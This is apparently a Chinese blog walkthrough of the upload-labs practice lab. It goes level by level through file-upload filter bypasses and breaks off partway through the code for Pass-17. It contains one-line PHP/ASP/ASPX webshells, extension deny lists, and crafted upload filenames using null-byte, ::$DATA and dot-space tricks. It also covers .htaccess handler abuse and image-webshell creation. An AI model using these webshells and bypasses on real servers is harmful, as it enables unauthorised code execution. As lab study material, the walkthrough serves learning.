+<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php的一句话木马： &lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;</span><br><span class="line">asp的一句话是：   &lt;%eval request (&quot;attack&quot;)%&gt;</span><br><span class="line">aspx的一句话是：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;attack&quot;],&quot;unsafe&quot;);%&gt;</span><br><span class="line">phtml格式:GIF89a  //习惯在文件前加上GIF89a来绕过PHP getimagesize的检查</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;system(&#x27;cat /flag&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="php一句话木马的解释"><a href="#php一句话木马的解释" class="headerlink" title="php一句话木马的解释"></a>php一句话木马的解释</h3><p>1、php的代码要写在<?php ?>里面，服务器才能认出来这是php代码，然后才去解析<br>2、@符号的意思是不报错，即使执行错误，也不报错<br>为什么呢？因为一个变量没有定义，就被拿去使用了，服务器就善意的提醒：Notice，你的xxx变量没有定义。这不就暴露了密码吗？所以我们加上@<br>3、$_POST[‘a’];的意思就是a这个变量，用post的方法接收<br>4、eval()把字符串作为PHP代码执行</p>
+<ul>
+<li>连起来意思就是：用post方法接收变量pw，把变量pw里面的字符串当做php代码来执行</li>
+</ul>
+<h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p><strong>Javascript 前端检查</strong><br>一般都是通过 JS 限制上传的文件类型，对于这种情况，我们可以采用以下几种方式绕过:<br>1、上传png后缀的一句话木马，代理抓包，修改上传的文件后缀<br>2、修改JS文件（推荐）<br>3、禁用js<br>$_FILES中的那些参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$_FILES这个变量用与上传的文件参数设置，是一个多维数组</span><br><span class="line">数组的用法就是 $_FILES[&#x27;key&#x27;][&#x27;key2&#x27;];</span><br><span class="line">$_FILES[&#x27;upfile&#x27;]是你表单上传的文件信息数组，upfile是文件上传字段，在上传时由服务器根据上传字段设定。</span><br><span class="line"></span><br><span class="line">$_FILES[&#x27;upfile&#x27;]包含了以下内容:</span><br><span class="line">$_FILES[&#x27;upfile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。</span><br><span class="line">$_FILES[&#x27;upfile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。</span><br><span class="line">$_FILES[&#x27;upfile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节。</span><br><span class="line">$_FILES[&#x27;upfile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名。</span><br><span class="line">$_FILES[&#x27;upfile&#x27;][&#x27;error&#x27;] 和该文件上传相关的错误代码。</span><br></pre></td></tr></table></figure>
+<p>源码中的js代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    function checkFile() &#123;</span><br><span class="line">        var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;</span><br><span class="line">        if (file == null || file == &quot;&quot;) &#123;</span><br><span class="line">            alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        //定义允许上传的文件类型</span><br><span class="line">        var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">        //提取上传文件的类型</span><br><span class="line">        var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">        //判断上传文件类型是否允许上传</span><br><span class="line">        if (allow_ext.indexOf(ext_name) == -1) &#123;</span><br><span class="line">            var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>alert()<br>作用：在浏览器中弹出一个警示框，警示框的警示内容可以人为自定义<br>alert 语句是一个 js 内置好的功能（函数、方法），要想实现功能必须在 alert 关键字后面 加小括号执行，自定义的内容需要传递给小括号内的参数，输出时参数位置的内容<code>alert(&quot;请选择要上传的文件!&quot;);</code>会出现 在弹框位置<br>通关思路：<br>f12-&gt;查看器-&gt;找到调用检验函数语句<br><img src="/./img/139.png"><br>将onsubmit&#x3D;”return checkFile()”删去即可提交</li>
+</ul>
+<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>本题要求对数据包中的<strong>MIME</strong>进行检查<br>MIME是什么？<br>简单来说就是文件的后缀<br>在HTTP中，MIME类型被定义在Content-Type header中<br>常见的类型如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">超文本标记语言文本 .html text/html</span><br><span class="line">PDF文档 .pdf application/pdf</span><br><span class="line">PNG图像 .png image/png</span><br><span class="line">JPEG图形 .jpeg,.jpg image/jpeg</span><br></pre></td></tr></table></figure>
+<p>源码中从这里可以看出是对MIME的检验：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;))</span><br></pre></td></tr></table></figure>
+<ul>
+<li>pass：<br>1、抓包后找到MIMIE的位置，在Content-Type中<br><img src="/./img/140.png"><br>更改其为image&#x2F;jpeg，放包即可上传<br>2、用正确形式上传，再在bp上改成php格式</li>
+</ul>
+<h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p><strong>黑名单验证</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br></pre></td></tr></table></figure>
+<ul>
+<li>trim()函数是用来清除文本首尾多余的空格以及文本中的重复空格</li>
+<li>strrchr() 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符<br>strrchr(string,char)<br>string:被搜索的字符串<br>char:要查找的字符。如果该参数是数字，则搜索匹配数字 ASCII 值的字符<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo strrchr(&quot;Hello world!&quot;,111);</span><br><span class="line">?&gt;</span><br><span class="line">运行结果：orld! </span><br></pre></td></tr></table></figure></li>
+<li><code>::$DATA</code>：在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名<br>eg:”phpinfo.php::$DATA”Windows会自动去掉末尾的::$DATA变成”phpinfo.php”</li>
+<li>pass：上传的后缀名只要不在那几个之间，可以使用<br>PHP：php4&#x2F;php5&#x2F;phtml&#x2F;php3&#x2F;pht<br>当我们不知道什么被加入黑名单的话，我们还能用bp爆破一下</li>
+</ul>
+<h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p><strong>htaccess文件利用</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br></pre></td></tr></table></figure>
+<ul>
+<li>概念：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</li>
+<li>.htaccess文件内容：<code>SetHandler application/x-httpd-php</code><br>设置当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当作PHP执行。不符合则报错。<br>指定文件：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;文件名&quot;&gt;</span><br><span class="line">setHandler application/x-httpd-php  </span><br><span class="line">&lt;/FilesMatch&gt; </span><br></pre></td></tr></table></figure></li>
+<li>pass：1、新建.txt文件，输入SetHandler application&#x2F;x-httpd-php,修改后缀为.htaccess,上传<br>再建立一个txt文件，写上一句话木马，改成它允许的格式（eg：png），上传即可<br>2、将文件后缀名改为”点+空格+点”的格式，这样file_ext会变为空，成功绕过黑名单上传。Windows会自动删除文件名最后的点，最后变为1.php<br><code>Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php. .&quot;</code></li>
+<li>.htaccess利用防范：黑名单限制</li>
+</ul>
+<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>过滤了.htaccess，但是$file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点，仍然只过滤了一次点，所以使用. .绕过</p>
+<h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>代码中未用strtolower()把文件后缀名变为小写，使用大小写绕过</p>
+<h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>代码中未用trim()去除首尾空格，截包时文件名后加空格绕过即可,这样即是.php后缀又不会被黑名单过滤<br><code>Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php  &quot;</code></p>
+<h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>代码中未用deldot()去除点，使用BurpSuite截包，文件名后加点绕过即可<br><code>Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php.&quot;</code></p>
+<h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>代码中未用str_ireplace()过滤::$DATA数据流标记，在BurpSuite中加入::$DATA到文件名末尾即可。在访问时去掉URL中的::$DATA<br><code>Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php::$DATA&quot;</code></p>
+<h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>“点+空格+点”过滤</p>
+<h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;        </span><br><span class="line">        if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code>将出现在黑名单中的后缀名替换成空白字符串，但无论文件名是否被匹配都会被上传。鉴于源代码中只过滤了一次，我们可以使用双写绕过方法上传（如：.jjspsp）。这样str_ireplace()函数会将字符串”jsp”替换为空白，但替换后剩下的字符串刚好为”.jsp”</p>
+<ul>
+<li>pass:文件名为“shell.pphphp”，直接上传即可</li>
+</ul>
+<h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p><strong>%00截断漏洞</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>in_array():搜索数组中是否存在指定的值</li>
+<li>strrpos():查找字符串在另一字符串中最后一次出现的位置（区分大小写）</li>
+<li>substr():返回字符串的一部分<br>这里<code>strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)</code>就是找到.最后一次出现的位置，+1使刚好取到.,那么substr取到的就是文件后缀,所以这里后缀被强行规定了</li>
+</ul>
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>ps:适用于php版本&lt;5.3.4,且服务中器的php.ini中的magic_quotes_gpc &#x3D; Off，才可以进行%00截断<br>原理：php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00.<br>补充：1、C语言标准库中对字符串的处理都会以\0作为字符串结束标志，任何字符串之后都会自动加上’\0’。’\0’的意思是 ASCII 码为 0 的字符，对应的字符是（Null），表示字符串结束符<br>2、magic_quotes_gpc 着重偏向数据库方面，是为了防止sql注入，但magic_quotes_gpc开启还会对<code>$_REQUEST, $_GET,$_POST,$_COOKIE </code>输入的内容进行过滤</p>
+<p>pass：上传路径是可控的<code>$_GET[&#39;save_path&#39;]</code>，后面还有一个后缀名需要绕过,并且是以拼接的形式<br><img src="/./img/141.png"></p>
+<h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>查看源代码，和第十一关对比，发现接受值变成了post，那么思路就和第十一关一样，不过post方式不会自行解码，所以要对%00进行urldecode<br>burp可以进行快捷编码，选中%00右键convert selection即可进行快速url编码<br><img src="/./img/142.png"><br>也可以这样<br><img src="/./img/143.png"><br><img src="/./img/144.png"><br>把6的ascii改成00<br><img src="/./img/145.png"></p>
+<h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p><strong>上传图片马</strong><br>PHP版本&gt;5.3  必须在php.ini中开启allow_url_fopen选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function getReailFileType($filename)&#123;</span><br><span class="line">    $file = fopen($filename, &quot;rb&quot;);</span><br><span class="line">    $bin = fread($file, 2); //只读2字节</span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]);    </span><br><span class="line">    $fileType = &#x27;&#x27;;    </span><br><span class="line">    switch($typeCode)&#123;      </span><br><span class="line">        case 255216:            </span><br><span class="line">            $fileType = &#x27;jpg&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 13780:            </span><br><span class="line">            $fileType = &#x27;png&#x27;;</span><br><span class="line">            break;        </span><br><span class="line">        case 7173:            </span><br><span class="line">            $fileType = &#x27;gif&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        default:            </span><br><span class="line">            $fileType = &#x27;unknown&#x27;;</span><br><span class="line">        &#125;    </span><br><span class="line">        return $fileType;</span><br></pre></td></tr></table></figure>
+<p>$file &#x3D; fopen($filename, “rb”);是以二进制读取模式打开文件<br>$strInfo &#x3D; @unpack(“C2chars”, $bin);这里是解包（用什么打包就用什么解包），然后以二进制输出<br>intval()对结果进行十进制转换，该函数会返回变量对应的integer数值<br>这里只会读取判断上传文件的前两个字节，即判断上传文件类型</p>
+<ul>
+<li>制作图片马<br>1、利用cmd制作<br><code>copy 1.php/b+1.jpg/a 2.jpg</code><br>2、利用Notepad++直接在末尾加上一句话<br>效果：<br><img src="/./img/146.png"></li>
+<li>pass：将图片马上传，打开include界面，并get传参<br><code>http://127.0.0.1/upload-labs-master/include.php?file=upload/6920230523120607.jpg</code><br>文件包含把文件强制当成php文件解析，所以可以直接用蚁剑连接</li>
+</ul>
+<h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>1、文件包含：服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行<br>2、文件包含函数<br>PHP中文件包含函数有以下四种：</p>
+<ul>
+<li>include()</li>
+<li>include_once()</li>
+<li>require()</li>
+<li>require_once()<br><strong>这四个函数的对比</strong><br>1、include在引入不存文件时产生一个警告且脚本还会继续执行，require则会导致一个致命性错误且脚本停止执行。<br>2、include_once,require_once函数的作用与include相同，不过它会首先验证是否已包含该文件。如果已经包含，则不再执行。<br>3、漏洞产生原因<br>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。<br>eg：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">if(isset($file))&#123;</span><br><span class="line">    include $file; </span><br></pre></td></tr></table></figure>
+<code>$_GET[‘file’]</code>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[‘file’]</code>的值，执行非预期的操作。</li>
+</ul>
+<p>后台使用包含函数include()处理文件中的代码时，如果发生错误，也会继续往下执行。也就是说，虽然前面的图片代码无法执行，但是最后的php代码是可以被执行的</p>
+<h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p><strong>getimagesize图片马</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    $types = &#x27;.jpeg|.png|.gif&#x27;;</span><br><span class="line">    if(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[2]);</span><br><span class="line">        if(stripos($types,$ext))&#123;</span><br><span class="line">            return $ext;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</li>
+<li>image_type_to_extension 根据指定的图像类型返回对应的后缀名</li>
+<li>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）<br>这题只是换了一个检验方式，做法同上一题</li>
+</ul>
+<h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。简单来说就是判断一个图像的类型<br>解法同上</p>
+<h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p><strong>二次渲染绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br><span class="line">    $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">    $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;];</span><br><span class="line">    $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.&#x27;/&#x27;.basename($filename);</span><br><span class="line"></span><br><span class="line">    // 